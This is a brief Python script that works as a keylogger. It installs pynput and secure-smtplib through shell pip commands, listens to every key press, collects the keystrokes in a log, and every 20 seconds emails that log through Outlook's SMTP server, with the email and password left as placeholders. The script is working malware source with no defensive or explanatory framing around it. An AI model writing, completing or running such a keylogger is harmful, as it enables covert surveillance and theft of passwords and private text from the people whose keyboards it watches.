import subprocess, os

command="pip install pynput"
result=subprocess.check_output(command,shell=True)

command="pip install secure-smtplib"
result=subprocess.check_output(command,shell=True)

import pynput.keyboard,threading,smtplib

log=str()
def process_key_press(key):
	global log
	try:
		log=log+str(key.char)
	except AttributeError:
		if key==key.space:
			log+=' '
		else:
			log=log+" "+str(key)+" "

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp-mail.outlook.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def report():
	global log
	log='\r\n'+log+'\r\n\r\n'
	loge=bytes(log,'utf-8')
	send_mail("your-email","your-password",loge)
	log=str()
	timer=threading.Timer(20,report)
	timer.start()

keyboard_listener=pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
	report()
	keyboard_listener.join()